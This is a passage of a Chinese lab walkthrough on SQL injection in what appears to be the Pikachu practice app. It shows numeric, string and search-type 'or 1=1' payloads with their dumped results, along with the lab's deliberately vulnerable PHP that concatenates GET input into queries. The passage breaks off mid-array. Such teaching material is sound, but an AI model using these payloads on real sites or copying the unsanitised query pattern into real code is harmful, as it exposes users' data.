</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">7</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><p>先做一个正常的查询操作</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="n">email</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">member</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+-------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">email</span><span class="w">             </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+-------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">vince</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">vince</span><span class="o">@</span><span class="n">pikachu</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+-------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">1</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><p>然后来复现一下注入操作</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="n">email</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">member</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+-------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">email</span><span class="w">             </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+-------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">vince</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">vince</span><span class="o">@</span><span class="n">pikachu</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">allen</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">allen</span><span class="o">@</span><span class="n">pikachu</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">kobe</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">kobe</span><span class="o">@</span><span class="n">pikachu</span><span class="p">.</span><span class="n">com</span><span class="w">  </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">grady</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">grady</span><span class="o">@</span><span class="n">pikachu</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">kevin</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">kevin</span><span class="o">@</span><span class="n">pikachu</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">lucy</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">lucy</span><span class="o">@</span><span class="n">pikachu</span><span class="p">.</span><span class="n">com</span><span class="w">  </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">lili</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="mi">114514</span><span class="o">@</span><span class="n">homo</span><span class="p">.</span><span class="n">jp</span><span class="w">    </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+-------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">7</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><p>似乎混进了一些奇怪的东西，是谁干的</p>
<p>可以看到所有数据都被遍历出来了</p>
<h3 id="字符型注入get">字符型注入（GET）</h3>
<p>是一个输入字符串查询数据的表单</p>
<p><img alt="img" src="./img/2022090-0-1.gif"></p>
<p><strong>人类恶显现</strong></p>
<p>猜测一下查询逻辑</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">PHP：</span><span class="nv">$username</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nx">SQL：select</span> <span class="nx">字段1</span><span class="p">,</span><span class="nx">字段2</span> <span class="nx">from</span> <span class="nx">表名</span> <span class="nx">where</span> <span class="nx">username</span> <span class="o">=</span> <span class="s1">&#39;lili&#39;</span><span class="p">;</span>
</span></span></code></pre></div><p>构造payload
单引号负责闭合SQL语句中字符串的前单引号，#号负责注释掉后单引号</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">lili</span><span class="s1">&#39; or 1=1 #
</span></span></span></code></pre></div><p><img alt="img" src="./img/2022091.png"></p>
<p><strong>注入成功</strong></p>
<p>后端源码片段</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;sqli_str.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span> <span class="o">.</span> <span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s2">&#34;inc/config.inc.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s2">&#34;inc/function.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s2">&#34;inc/mysql.inc.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$link</span><span class="o">=</span><span class="nx">connect</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">!=</span><span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//这里没有做任何处理，直接拼到select里面去了
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$name</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//这里的变量是字符型，需要考虑闭合
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select id,email from member where username=&#39;</span><span class="si">$name</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span><span class="o">=</span><span class="nx">execute</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">mysqli_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="nv">$data</span><span class="o">=</span><span class="nx">mysqli_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$id</span><span class="o">=</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$email</span><span class="o">=</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p class=&#39;notice&#39;&gt;your uid:</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2"> &lt;br /&gt;your email is: </span><span class="si">{</span><span class="nv">$email</span><span class="si">}</span><span class="s2">&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p class=&#39;notice&#39;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>数据库内容不再赘述</p>
<h3 id="搜索型注入">搜索型注入</h3>
<p>是一个支持模糊查询的表单</p>
<p><img alt="img" src="./img/2022090-0-2.gif"></p>
<p>模糊查询在SQL语句中是这样实现的</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">member</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%l%&#39;</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></div><p>原理知道了，构造payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">xxx</span><span class="o">%</span><span class="s1">&#39; or 1=1 #
</span></span></span></code></pre></div><p><img alt="img" src="./img/2022091-1.png"></p>
<p><strong>注入成功</strong></p>
<h3 id="xx型注入">XX型注入</h3>
<p>作为介绍，先来看后端源码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;sqli_search.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span 